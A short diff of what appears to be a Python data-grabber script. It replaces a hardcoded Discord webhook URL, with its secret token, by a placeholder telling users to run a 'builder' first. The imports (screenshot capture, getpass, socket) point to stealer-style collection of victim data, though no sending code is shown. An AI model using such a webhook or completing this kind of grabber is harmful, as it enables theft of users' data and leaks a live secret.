@@ -13,7 +13,7 @@ import random, subprocess, platform, socket
 import time, os
 import getpass
 
-whook = "https://discord.com/api/webhooks/1073429519010103318/Bb-QBNk7fhFkrUBoYwo-DGlg3tbgfoCTX42lqLY9L7S7FPqa48IHedsT6cCL3rOGdXsp"
+whook = "run builder py first"
 
 try:
     from PIL import ImageGrab
